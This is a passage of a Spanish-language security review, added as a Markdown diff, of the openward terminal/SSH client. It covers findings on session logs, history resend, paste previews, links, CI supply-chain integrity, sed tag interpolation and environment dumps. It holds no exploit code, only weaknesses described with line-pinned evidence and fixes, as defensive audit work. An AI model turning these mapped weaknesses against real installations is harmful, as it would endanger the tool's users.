+- **Siguiente paso:** Conservar y explicar la prioridad de los guardados; cuotas por host son una mejora de aislamiento y disponibilidad.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/recorder.rs:1-40](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/recorder.rs#L1-L40); [core/crates/openward-app/src/logs/mod.rs:489-525](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L489-L525).
+
+#### RG-4 · Carga completa de grabaciones al reproducir o exportar
+
+**No accionable en el alcance actual · Robustez pendiente**. Gravedad original: Baja (la app se cae).
+
+Varias operaciones leen y descomprimen el registro entero; el escape JSON de controles puede amplificar su tamaño.
+
+- **Condiciones e impacto:** Registro grande o muy compresible creado por salida del servidor. Consumo elevado de memoria en consulta, exportación o reproducción.
+- **Controles y límites:** El efecto descrito es agotar recursos con salida del servidor, excluido por el modelo. No se identifica una lectura de archivos arbitrarios ni ejecución por el reproductor.
+- **Pendiente de prueba/contexto:** No se repiten medidas de GiB/tiempo ni pruebas de caída.
+- **Siguiente paso:** Pasar a lectura/exportación por bloques y limitar expansiones como mejora de robustez y requisito del trabajo D6.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/mod.rs:595-621](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L595-L621); [core/crates/openward-app/src/logs/mod.rs:703-740](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L703-L740); [core/crates/openward-app/src/logs/cast.rs:149-171](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/cast.rs#L149-L171).
+
+#### RG-5 · Metadatos de sesión y ajuste Conexiones recientes
+
+**Necesita revisión · Contrato de privacidad por aclarar** · **Prioridad R14**. Gravedad original: Baja.
+
+Logs.begin crea una entrada aunque la grabación esté desactivada; el ajuste de recientes controla la presentación en inicio/paleta, no esa entrada del registro.
+
+- **Condiciones e impacto:** Recientes desactivados; Inicio de sesión. Diferencia entre expectativa de privacidad y persistencia de metadatos.
+- **Controles y límites:** La interfaz distingue entradas sin grabación y el borrado de recientes describe su alcance de lista. Persistir metadatos está documentado en el modelo.
+- **Pendiente de prueba/contexto:** Falta decidir si el texto de ayuda de recientes comunica suficientemente esa separación, incluidos terminales locales.
+- **Siguiente paso:** Aclarar el texto y ofrecer controles separados si se pretende permitir sesiones sin ningún metadato persistente.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/mod.rs:352-399](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L352-L399); [app/lib/l10n/app_es.arb:3272-3272](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/l10n/app_es.arb#L3272).
+
+#### RG-6 · Fidelidad del texto derivado y caracteres de control
+
+**Necesita revisión · Filtro confirmado; impacto visual pendiente** · **Prioridad R13**. Gravedad original: Baja.
+
+TextFilter termina OSC/DCS/APC con BEL o ESC y deja pasar Unicode bidi y ancho cero; no trata CAN/SUB como fin. El texto derivado puede divergir del replay.
+
+- **Condiciones e impacto:** Salida remota con secuencias canceladas o controles Unicode. Posible omisión o presentación engañosa en búsqueda y exportación de texto.
+- **Controles y límites:** El filtro declara que es aproximado y el cast conserva la salida original. No se ha verificado aquí la presentación exacta de Ghostty/Flutter para cada secuencia.
+- **Pendiente de prueba/contexto:** Falta comprobar cancelación CAN/SUB y el efecto visual del bidi en las vistas actuales antes de cerrar el alcance de engaño.
+- **Siguiente paso:** Revisar cancelación de secuencias y hacer visibles los controles en resultados/comandos; contrastar con la salida realmente mostrada.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/text.rs:45-90](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/text.rs#L45-L90); [app/lib/logs/logs_page.dart:671-675](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/logs/logs_page.dart#L671-L675).
+
+#### RG-7 · Texto reconstruido desde la pantalla que se reenvía desde el historial
+
+**Confirmado · Vigente** · **Prioridad C8**. Gravedad original: Baja.
+
+Las líneas editadas se reconstruyen de la pantalla controlada por el servidor. La paleta ofrece historial de otros hosts y _send reenvía con salto de línea sin la comprobación de controles aplicada al pegado normal.
+
+- **Condiciones e impacto:** Servidor altera la pantalla de una línea editada; Selección posterior del historial, posiblemente en otro host. Ejecución de texto distinto del que el usuario cree recuperar.
+- **Controles y límites:** El usuario debe seleccionar una entrada; hay indicación de origen y preferencia por el host actual, pero no un filtro estricto ni una revisión completa del texto reenviado.
+- **Pendiente de prueba/contexto:** No se ha ejecutado un comando desde el historial en esta revisión.
+- **Siguiente paso:** Tratar la reconstrucción de pantalla como no confiable, mostrar controles y origen, y aplicar la misma confirmación antes de enviar a otro destino.
+- **Evidencia en main:** [core/crates/openward-ghostty/src/engine.rs:1059-1088](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ghostty/src/engine.rs#L1059-L1088); [app/lib/history/line_tracker.dart:125-165](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/history/line_tracker.dart#L125-L165); [app/lib/palette/command_palette.dart:241-266](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/palette/command_palette.dart#L241-L266); [app/lib/palette/command_palette.dart:930-944](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/palette/command_palette.dart#L930-L944).
+
+#### RG-8 · Borrar todos no incluye archivos de registro huérfanos
+
+**Confirmado · Vigente** · **Prioridad C18**. Gravedad original: Baja.
+
+El mapa omite metadatos ilegibles y un fallo al escribir la entrada puede dejar el cast ya creado. delete_all borra los IDs del mapa, sin recorrer esos huérfanos ni temporales.
+
+- **Condiciones e impacto:** Metadatos dañados o escritura fallida; El usuario solicita borrar todos. Datos de sesión conservados después de una solicitud de eliminación total.
+- **Controles y límites:** La carpeta es privada y el borrado evita rutas arbitrarias. El problema es la garantía de eliminación de datos administrados, no acceso entre usuarios durante operación normal.
+- **Pendiente de prueba/contexto:** No se han provocado fallos de disco; el orden de creación y la selección por mapa explican el residuo.
+- **Siguiente paso:** Reconciliar archivos administrados con metadatos y barrer huérfanos seguros al borrar todo; no ampliar el borrado a archivos ajenos.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/mod.rs:235-260](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L235-L260); [core/crates/openward-app/src/logs/mod.rs:380-388](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L380-L388); [core/crates/openward-app/src/logs/mod.rs:450-481](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L450-L481).
+
+#### RG-9 · Otras observaciones de registros e historial
+
+**No accionable en el alcance actual · Límites y observaciones**. Gravedad original: Informativa.
+
+Se mantienen los casos de cast manipulado, panic de FFI, cambio de ajustes con sesión abierta, exportación a un destino elegido y replay en aplicaciones externas. El registro contiene salida/tiempos y comandos inferidos, no un volcado de todas las pulsaciones.
+
+- **Condiciones e impacto:** Acceso local al registro o decisiones explícitas de exportación/configuración. Riesgos locales condicionados y expectativas de comportamiento.
+- **Controles y límites:** Modificar casts privados requiere acceso del mismo UID; la FFI contiene panics y los visores externos quedan fuera del producto. El destino de exportación es una elección explícita.
+- **Pendiente de prueba/contexto:** No se demuestra un cruce adicional de confianza; no se afirma que cambiar el ajuste cierre una grabación ya abierta.
+- **Siguiente paso:** Documentar la semántica de ajustes y exportación y conservar estas observaciones como robustez/UX.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/mod.rs:450-481](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/mod.rs#L450-L481); [core/crates/openward-app/src/logs/recorder.rs:119-175](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/recorder.rs#L119-L175).
+
+### Terminal
+
+#### TE-1 · Confirmación de pegado con contenido fuera de la vista previa
+
+**Confirmado · Mitigación parcial** · **Prioridad C19**. Gravedad original: Baja.
+
+La vista previa se corta a 400 caracteres (600 en envío múltiple) sin una revisión completa del contenido que se autoriza.
+
+- **Condiciones e impacto:** Pegado largo con contenido relevante fuera de la vista previa; Confirmación del usuario. Autorización de líneas o controles que no se han podido revisar.
+- **Controles y límites:** El detector examina el texto completo y la visualización actual ya marca U+2028/U+2029; se retira la afirmación anterior de que esos separadores pasan sin marcar. Sigue sin haber vista completa de la cola.
+- **Pendiente de prueba/contexto:** No se ha pegado un payload; el problema es el consentimiento con contenido oculto, no ejecución automática al abrir la tarjeta.
+- **Siguiente paso:** Permitir revisar todo el texto y mostrar claramente cuánto contenido queda, con controles visibles en toda la previsualización.
+- **Evidencia en main:** [app/lib/terminal/paste.dart:13-40](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/paste.dart#L13-L40); [app/lib/terminal/paste.dart:94-110](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/paste.dart#L94-L110); [app/lib/terminal/visible_text.dart:1-50](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/visible_text.dart#L1-L50).
+
+#### TE-2 · Aviso multilínea y bracketed paste
+
+**No accionable en el alcance actual · Comportamiento de protocolo**. Gravedad original: Informativa.
+
+El motor trata el pegado según el modo 2004 indicado por el programa remoto, lo que cambia cuándo se necesita un aviso.
+
+- **Condiciones e impacto:** Programa remoto que cambia el modo 2004. Diferencias de comportamiento de pegado acordes al protocolo.
+- **Controles y límites:** Un servidor que controla su terminal ya controla lo que ejecuta allí; este mecanismo no demuestra ejecución local ni en otro host. El modo bracketed paste forma parte del protocolo.
+- **Pendiente de prueba/contexto:** No se identifica un salto de confianza distinto del contenido incompleto de TE-1.
+- **Siguiente paso:** Ofrecer siempre confirmar multilínea como preferencia de UX si se desea; no describir el modo 2004 como una vulnerabilidad por sí solo.
+- **Evidencia en main:** [app/lib/terminal/terminal_pane.dart:589-606](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/terminal_pane.dart#L589-L606).
+
+#### TE-3 · Enlaces ftp/mailto y presentación del destino
+
+**Necesita revisión · Pendiente de aplicaciones nativas** · **Prioridad R18**. Gravedad original: Informativa.
+
+La lista admite http, https, mailto y ftp y entrega la URL al manejador externo. La confirmación muestra el destino sin representar todos los caracteres de forma inequívoca.
+
+- **Condiciones e impacto:** Enlace remoto; Apertura consentida; Manejador nativo con comportamiento relevante. Posible engaño o acción inesperada de una aplicación externa.
+- **Controles y límites:** La apertura exige interacción/modificador y la lista de esquemas impide invocar esquemas arbitrarios.
+- **Pendiente de prueba/contexto:** El tratamiento de mailto/adjuntos o ftp depende del cliente y sus asociaciones; no se ha demostrado adjuntar/exfiltrar un archivo.
+- **Siguiente paso:** Normalizar la presentación y validar manejadores y parámetros peligrosos antes de atribuir un impacto específico.
+- **Evidencia en main:** [app/lib/terminal/links.dart:16-29](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/links.dart#L16-L29); [app/lib/terminal/links.dart:65-69](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/links.dart#L65-L69).
+
+#### TE-4 · Identificación del terminal y soporte de imágenes no utilizado
+
+**No accionable en el alcance actual · Reducción de superficie**. Gravedad original: Informativa.
+
+Se conservan la respuesta de versión y la capacidad de imágenes disponible en el motor.
+
+- **Condiciones e impacto:** Servidor que consulta capacidades o envía imágenes. Superficie adicional y consumo de recursos.
+- **Controles y límites:** Identificar la versión no demuestra explotación. El consumo de recursos por un servidor hostil está excluido; no se ha medido el supuesto pico de memoria.
+- **Pendiente de prueba/contexto:** No hay un fallo adicional validado en esas funciones.
+- **Siguiente paso:** Desactivar capacidades no utilizadas y revisar la identificación del terminal como endurecimiento, sin afirmar una corrección ya hecha.
+- **Evidencia en main:** [core/crates/openward-ghostty/src/engine.rs:72-72](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ghostty/src/engine.rs#L72); [core/crates/openward-ghostty/src/engine.rs:265-311](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ghostty/src/engine.rs#L265-L311).
+
+#### TE-5 · Análisis de temas iTerm2 mediante expresiones regulares
+
+**Necesita revisión · Complejidad pendiente de medir** · **Prioridad R19**. Gravedad original: Informativa.
+
+Se buscan valores XML con regex y el parseo se hace en el recorrido de interfaz.
+
+- **Condiciones e impacto:** Tema iTerm2 ajeno menor que el límite admitido. Posible bloqueo de interfaz condicionado al coste real del parser.
+- **Controles y límites:** La selección de temas sí rechaza archivos de 1 MiB o más; el informe inicial no reflejaba suficientemente ese límite.
+- **Pendiente de prueba/contexto:** Sin análisis formal o prueba acotada no se concluye una complejidad cuadrática ni una congelación actual.
+- **Siguiente paso:** Usar un parser plist/XML acotado o verificar el presupuesto temporal con entradas adversas dentro del límite.
+- **Evidencia en main:** [app/lib/terminal/scheme_import.dart:34-40](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/terminal/scheme_import.dart#L34-L40); [app/lib/settings/appearance_page.dart:590-592](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/settings/appearance_page.dart#L590-L592).
+
+### Build, CI y publicación
+
+#### CI-1 · Herramientas sin verificación de integridad en el contenedor Linux
+
+**Confirmado · Mitigación parcial** · **Prioridad C23**. Gravedad original: Media.
+
+El contenedor local sigue descargando Zig sin verificar el hash, ejecuta rustup desde la descarga y usa base/Flutter referenciados por tag. Ese camino sigue siendo parte del empaquetado.
+
+- **Condiciones e impacto:** Uso del empaquetador basado en contenedor; Fuente/tag de herramienta sustituido o comprometido. Ejecución de una herramienta no ligada al contenido revisado en el build.
+- **Controles y límites:** La CI Linux x64 alojada usa install-zig.sh con SHA-256; no se puede atribuir el fallo del contenedor a todos los artefactos actuales.
+- **Pendiente de prueba/contexto:** No se ha ejecutado el contenedor ni se afirma compromiso de una herramienta descargada.
+- **Siguiente paso:** Fijar base/commits y verificar hashes de herramientas en el contenedor igual que en el instalador de CI, antes de usarlo para distribuir.
+- **Evidencia en main:** [app/tool/linux/Containerfile:4-22](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/tool/linux/Containerfile#L4-L22); [app/tool/package-linux.sh:37-64](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/tool/package-linux.sh#L37-L64); [.github/scripts/install-zig.sh:6-30](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/scripts/install-zig.sh#L6-L30).
+
+#### CI-2 · La CI actual no ejecuta automáticamente forks en el equipo del mantenedor
+
+**No accionable en el alcance actual · Premisa operativa obsoleta**. Gravedad original: Media.
+
+Hay Actions alojadas para PRs/pushes y no se aceptan contribuciones externas de código antes de Community. Sobrevive documentación de la antigua puerta local.
+
+- **Condiciones e impacto:** Decisión manual de ejecutar código ajeno localmente. El escenario original no refleja el flujo de CI actual.
+- **Controles y límites:** No hay pull_request_target ni runner self-hosted que establezcan el salto descrito. Elegir ejecutar código ajeno como mantenedor no demuestra aquí una elevación adicional.
+- **Pendiente de prueba/contexto:** No se ha reproducido el escenario histórico ni inspeccionado equipos privados.
+- **Siguiente paso:** Actualizar comentarios de la puerta local y mantener aisladas las validaciones de contribuciones no confiables.
+- **Evidencia en main:** [.github/workflows/ci.yml:1-61](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/workflows/ci.yml#L1-L61); [CONTRIBUTING.md:1-41](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/CONTRIBUTING.md#L1-L41); [tool/ci.sh:1-40](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/tool/ci.sh#L1-L40).
+
+#### CI-3 · Reporte privado de vulnerabilidades desactivado
+
+**Confirmado · Vigente; verificado en GitHub** · **Prioridad C25**. Gravedad original: Baja.
+
+El repositorio es público, pero GET /repos/KaiCorpLabs/openward/private-vulnerability-reporting devuelve enabled=false el 11-11-2026. SECURITY.md remite al canal privado de GitHub.
+
+- **Condiciones e impacto:** Investigador externo que sigue SECURITY.md. No puede utilizar el canal privado anunciado para reportar un problema.
+- **Controles y límites:** La antigua explicación basada en que el repositorio era privado ya no es válida; la comprobación actual identifica el ajuste concreto que falta.
+- **Pendiente de prueba/contexto:** No se cambia esa configuración administrativa en esta PR documental; no se ha enviado ninguna vulnerabilidad por un canal público.
+- **Siguiente paso:** Habilitar private vulnerability reporting o publicar un contacto privado utilizable, y verificar el enlace como colaborador externo.
+- **Evidencia en main:** [SECURITY.md:1-23](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/SECURITY.md#L1-L23).
+
+#### CI-4 · Interpolación del tag en sed dentro de una release manual
+
+**No accionable en el alcance actual · Endurecimiento; sin escalada demostrada**. Gravedad original: Baja (pide permiso de escritura).
+
+El tag se inserta en el programa sed sin validar su alfabeto; el mecanismo de inyección descrito sigue siendo técnicamente relevante.
+
+- **Condiciones e impacto:** Actor con permisos para crear tags y ejecutar workflows. Riesgo condicionado a una futura separación de privilegios; hoy el actor ya puede cambiar el build.
+- **Controles y límites:** El workflow es manual y crear el tag/ejecutarlo exige permisos de escritura. No se han encontrado reglas o roles que separen a ese actor de quien puede modificar el workflow; no hay escalada de privilegios demostrada.
+- **Pendiente de prueba/contexto:** Reevaluar si se introducen tags protegidos, actores con permisos distintos o secretos de publicación separados.
+- **Siguiente paso:** Validar tags con una gramática estricta y evitar construir código sed con datos antes de ampliar privilegios del job.
+- **Evidencia en main:** [.github/workflows/ci.yml:475-495](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/workflows/ci.yml#L475-L495).
+
+#### CI-5 · El borrador de release solo depende del job app
+
+**Necesita revisión · Contrato de publicación pendiente** · **Prioridad R16**. Gravedad original: Baja.
+
+release necesita app, no todos los jobs, y no comprueba ascendencia del tag respecto a main. Es un borrador manual, no una publicación automática.
+
+- **Condiciones e impacto:** Release manual desde tag; Otros checks fallan o el tag no procede de main. Posible borrador de distribución sin todas las garantías de validación previstas.
+- **Controles y límites:** El job descarga artefactos de su propio run. No se ha confirmado el antiguo supuesto de fallo 403 por actions:read ni una promoción de artefactos de forks.
+- **Pendiente de prueba/contexto:** Falta establecer la puerta obligatoria de publicación y verificar permisos efectivos del job antes de atribuir un bypass explotable.
+- **Siguiente paso:** Exigir los checks acordados y procedencia del tag para publicar; validar permisos de descarga con evidencia de un run, sin asumir un fallo.
+- **Evidencia en main:** [.github/workflows/ci.yml:470-502](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/workflows/ci.yml#L470-L502).
+
+#### CI-6 · Cachés compartidas del empaquetador local
+
+**No accionable en el alcance actual · Aislamiento local pendiente**. Gravedad original: Baja.
+
+Los volúmenes del empaquetador y el caché de libghostty son compartidos. El hash usado para invalidar no autentica contra quien puede escribir el caché.
+
+- **Condiciones e impacto:** Código ya ejecutado con acceso al caché local del mantenedor. Contaminación local condicionada a acceso previamente equivalente.
+- **Controles y límites:** El escenario local necesita ejecutar código con acceso de escritura del propio mantenedor, actor excluido por el modelo. Las cachés de PRs de Actions tienen alcance de merge ref y no pueden sobrescribir las de main.
+- **Pendiente de prueba/contexto:** No se demuestra un camino desde un fork alojado hasta un caché confiable de main.
+- **Siguiente paso:** Aislar/limpiar cachés de releases y documentar su carácter no autenticado; reevaluar si se añade infraestructura compartida entre identidades.
+- **Evidencia en main:** [app/tool/package-linux.sh:56-64](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/tool/package-linux.sh#L56-L64); [core/crates/openward-ghostty/build-libghostty.sh:65-87](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ghostty/build-libghostty.sh#L65-L87).
+
+#### CI-7 · Runner de cargokit sin resolución transitiva bloqueada
+
+**Confirmado · Vigente; reproducibilidad de build** · **Prioridad C24**. Gravedad original: Baja.
+
+El script genera otro runner y ejecuta pub get sin trasladar el lockfile del build_tool. Las dependencias directas están fijadas intencionadamente, pero no toda su resolución transitiva.
+
+- **Condiciones e impacto:** Build del runner generado; Cambio admisible de una dependencia transitiva. Ejecución de código de build no ligado al lockfile revisado.
+- **Controles y límites:** No se afirma que todas las dependencias floten ni que haya una dependencia comprometida; el problema es la resolución nueva fuera del conjunto revisado.
+- **Pendiente de prueba/contexto:** No se ha resuelto de nuevo el runner ni comparado versiones descargadas.
+- **Siguiente paso:** Usar una resolución bloqueada también para el runner generado y hacer revisables sus cambios transitivos.
+- **Evidencia en main:** [app/rust_builder/cargokit/run_build_tool.sh:23-34](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/rust_builder/cargokit/run_build_tool.sh#L23-L34); [app/rust_builder/cargokit/run_build_tool.sh:73-77](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/rust_builder/cargokit/run_build_tool.sh#L73-L77); [app/rust_builder/cargokit/build_tool/pubspec.yaml:14-33](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/rust_builder/cargokit/build_tool/pubspec.yaml#L14-L33).
+
+#### CI-8 · Volcado completo del entorno en build_pod.sh
+
+**Necesita revisión · Exposición condicionada** · **Prioridad R17**. Gravedad original: Baja.
+
+El script conserva una llamada incondicional a env que envía las variables al log.
+
+- **Condiciones e impacto:** Build macOS con variables sensibles; Log accesible a otro actor. Posible exposición de secretos por diagnóstico.
+- **Controles y límites:** No se han identificado secretos asignados al job app actual; GH_TOKEN está en el job release separado. El enmascarado de Actions tampoco garantiza proteger cualquier formato futuro.
+- **Pendiente de prueba/contexto:** Falta demostrar una variable sensible presente y un lector del log con menos privilegios; no se afirma una filtración efectiva.
+- **Siguiente paso:** Retirar el volcado general y limitar el diagnóstico a variables no sensibles antes de incorporar firma/credenciales al build.
+- **Evidencia en main:** [app/rust_builder/cargokit/build_pod.sh:14-14](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/rust_builder/cargokit/build_pod.sh#L14).
+
+#### CI-9 · crypto-bigint de core actualizado y cargo deny validado
+
+**No accionable en el alcance actual · Corregido en core**. Gravedad original: Baja.
+
+El lockfile principal contiene crypto-bigint 0.7.10. La CI de main 35ab7a6 completó cargo deny y el resto de checks.
+
+- **Condiciones e impacto:** Lockfile de core en main 35ab7a6. El fallo concreto del lockfile principal ya no está presente.
+- **Controles y límites:** La denuncia de core 0.7.6 y de su fallo de CI quedó obsoleta. El lockfile independiente del spike no se confunde con el distribuido.
+- **Pendiente de prueba/contexto:** No se ha ejecutado una auditoría nueva durante este contraste estático ni se certifican todos los ecosistemas.
+- **Siguiente paso:** Conservar la puerta cargo deny y seguir las actualizaciones del spike por separado.
+- **Evidencia en main:** [core/Cargo.lock:620-630](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/Cargo.lock#L620-L630); [.github/workflows/ci.yml:1-61](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/workflows/ci.yml#L1-L61).
+
+#### CI-10 · Artefactos de PR con nombres parecidos a los de distribución
+
+**No accionable en el alcance actual · Procedencia visible; UX mejorable**. Gravedad original: Baja.
+
+Algunos artefactos Linux/Windows de PR mantienen nombres de versión; el snapshot de macOS sí incluye commit.
+
+- **Condiciones e impacto:** Descarga manual de un artefacto de PR. Posible confusión de procedencia, sin promoción automática a una release confiable.
+- **Controles y límites:** El run identifica PR y origen, y release descarga exclusivamente su propio GITHUB_RUN_ID. No hay una ruta de promoción automática de artefactos de forks a release.
+- **Pendiente de prueba/contexto:** El riesgo restante es confusión de un usuario que descargue artefactos de prueba, sin un bypass de publicación demostrado.
+- **Siguiente paso:** Prefijar artefactos de PR, mostrar SHA/origen y reducir su retención como mejora de procedencia.
+- **Evidencia en main:** [.github/workflows/ci.yml:470-502](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/workflows/ci.yml#L470-L502).
+
+#### CI-11 · Empaquetado local y garantías de procedencia
+
+**No accionable en el alcance actual · Requisito de distribución futura**. Gravedad original: Baja.
+
+El empaquetador Linux admite árbol con cambios y no genera sumas/atestaciones comunes; ese nombre lleva explícitamente commit y sufijo dirty.
+
+- **Condiciones e impacto:** Empaquetado local y futura distribución pública. Garantías de publicación aún incompletas, documentadas como requisito.
+- **Controles y límites:** No se hace pasar silenciosamente un árbol sucio por un tag limpio. La publicación y firma definitiva siguen pendientes en el plan; no existe una promesa actual de procedencia autenticada equivalente para todos los paquetes.
+- **Pendiente de prueba/contexto:** No se ha construido ni publicado un paquete en esta revisión.
+- **Siguiente paso:** Antes de distribuir Community, exigir árbol/tag acordados y producir sumas y procedencia verificables, manteniendo las garantías macOS existentes.
+- **Evidencia en main:** [app/tool/package-linux.sh:44-68](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/tool/package-linux.sh#L44-L68); [app/tool/package-macos.sh:33-46](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/tool/package-macos.sh#L33-L46).
+
+#### CI-12 · Otros aspectos de build, datos personales y dependencias de spikes
+
+**Necesita revisión · Observaciones mixtas actualizadas** · **Prioridad R20**. Gravedad original: Informativa.
+
+Se conservan correo público y firma de tags, Hardened Runtime, ignores de datos/credenciales, fixtures, imágenes por tag y descarga interna de Flutter. El setup.sh de la acción fijada descarga el SDK sin una comprobación de hash; usar sha256 en la clave de caché no lo verifica. action.yaml además invoca actions/cache@v5 por tag.
+
+- **Condiciones e impacto:** Dependencias de tooling, configuración de firma o archivos de trabajo particulares. Endurecimiento de cadena de suministro y privacidad con subcasos de distinto alcance.
+- **Controles y límites:** El repositorio ya es público, el escenario de inyección macOS presupone mismo UID y las fixtures son intencionadas. El spike no se distribuye y su Tokio ya es 1.54.1: se retira la afirmación de que sigue en 1.53.2.
+- **Pendiente de prueba/contexto:** No se ha repetido una búsqueda completa de secretos ni una auditoría del spike; no se conservan como vigentes todos los avisos antiguos de RustSec sin revalidación. Falta comprobar por separado los efectos de firma e imágenes.
+- **Siguiente paso:** Verificar integridad del SDK, mantener ignores/fixtures deliberados y revisar el lockfile del spike separadamente; no reescribir el historial personal ni afirmar secretos encontrados.
+- **Evidencia en main:** [.github/workflows/ci.yml:1-61](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.github/workflows/ci.yml#L1-L61); [app/macos/Runner.xcodeproj/project.pbxproj:1-120](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/macos/Runner.xcodeproj/project.pbxproj#L1-L120); [.gitignore:1-55](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/.gitignore#L1-L55); [spikes/s2-ssh/sshprobe/Cargo.lock:1-100](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/spikes/s2-ssh/sshprobe/Cargo.lock#L1-L100).
+
+## Fuentes externas y verificación
+
+Las referencias de código anteriores están fijadas a `35ab7a63187a58aae132a31bd000ab0858164dff`; sus líneas no cambian al avanzar main.
+
+- CO-3, CO-4 y DA-3 también contrastan las implementaciones locales fijadas en Cargo.lock: `russh 0.64.1` (`client/kex.rs`, comprobación de firma) y `ssh-key 0.7.0-rc.11` (`public/ecdsa.rs`, `public/ssh_format.rs`, `signature.rs`). En ssh-key la revisión de origen indicada por el paquete es `7a1c757d2e2fcde32680e373d5226481de6d434e`. La igualdad del punto codificado y la preservación del comentario se observan en esa dependencia concreta; no se extrapolan a versiones futuras.
+- CI-4/CI-6: la documentación oficial indica el permiso de escritura requerido para [ejecutar manualmente un workflow](https://docs.github.com/en/actions/how-tos/manage-workflow-runs/manually-run-a-workflow) y el [alcance de los cachés de PR al merge ref](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching). Son controles del flujo alojado; no protegen un caché local compartido por el mantenedor.
